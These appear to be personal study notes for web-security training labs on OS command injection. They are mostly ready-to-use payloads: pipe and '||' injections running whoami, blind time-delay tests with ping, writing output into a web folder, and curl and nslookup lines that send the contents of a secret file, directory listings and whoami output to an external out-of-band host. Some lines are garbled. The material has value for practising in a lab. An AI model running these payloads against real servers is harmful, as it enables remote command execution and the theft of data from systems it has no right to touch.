# OS command injection

## Description

OS command injection (also known as shell injection) is a web security 
vulnerability that allows an attacker to execute arbitrary operating system (OS) 
commands on the server that is running an application, and typically 
fully compromise the application and all its data. Very often, an attacker can 
leverage an OS command injection vulnerability to compromise other parts of the hosting 
infrastructure, exploiting trust relationships to pivot the attack to other 
systems within the organization.

### OS command injection, simple case

```
Modify the storeID parameter, giving it the value 1|whoami
```

### Blind OS command injection with time delays

Launching this command will make you to understand if the command is injectable:
```
email=x||ping+-c+10+127.0.0.1|| if the request takes some second, you can exploit

affert this you can send a curl with a body:

if it's possible you can try this payload:
CARLO=$(cat /home/carlos/secret)

CARLO=$(ls /);curl -i -s -k -X $'POST' -H $'Host: 2psvg4k5bmueqaufdc82cpg4pvvmjb.oastify.com' -H
$'Content-Length: 6' --data-binary $CARLO $'https://2psvg4k5bmueqaufdc82cpg4pvvmjb.oastify.com/'

A variant of this could be 
"curl -i -s -k -X $'POST' -H $'Host: w85pzy3zugd894d9w6rwvjzy8pei27.oastify.com' -H $'Content-Length: 6' --data-binary $`whoami` $'https://w85pzy3zugd894d9w6rwvjzy8pei27.oastify.com/'"
```

### Blind OS command injection

(I suppose that maybe this can help you to succeed at the final stage, retriving SECRET=($cat /home/carlos/secret");..
you can also use this type of exploit writing the output in a file and save it in a folder where you have the possibility to read the file

```
email=||whoami>/var/www/images/output.txt|
filename=output.txt
```

### Blind OS command injection with out-of-band interaction

The application executes a shell command containing the user-supplied details. 
The command is executed asynchronously and has no effect on the application's response. 
It is not possible to redirect output into a location that you can access. 
However, you can trigger out-of-band interactions with an external domain.

Another way
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| 


### Blind OS command injection with out-of-band data exfiltration

email=||nslookup+\`whoami\`.BURP-COLLABORATOR-SUBDOMAIN||
